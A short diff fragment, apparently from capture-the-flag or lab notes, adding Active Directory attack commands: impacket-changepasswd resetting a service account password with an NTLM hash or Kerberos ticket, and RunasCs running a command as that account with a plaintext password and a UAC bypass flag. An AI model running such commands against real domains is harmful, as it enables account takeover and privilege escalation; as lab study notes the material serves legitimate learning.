@@ -54,4 +54,7 @@ python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","P
 7facdc498ed1680c4fd1448319a8c04f
 
 impacket-changepasswd -hashes :816ccb849956b531db139346751db65f -newhash :7facdc498ed1680c4fd1448319a8c04f 'darkzero.ext/svc_sql'@dc02.darkzero.ext
+impacket-changepasswd -k -no-pass 'domain/user'@dc.domain.local
+
+.\RunasCs.exe svc_sql Password1! "whoami /priv" --logon-type 5 --function 2 --bypass-uac
 ```
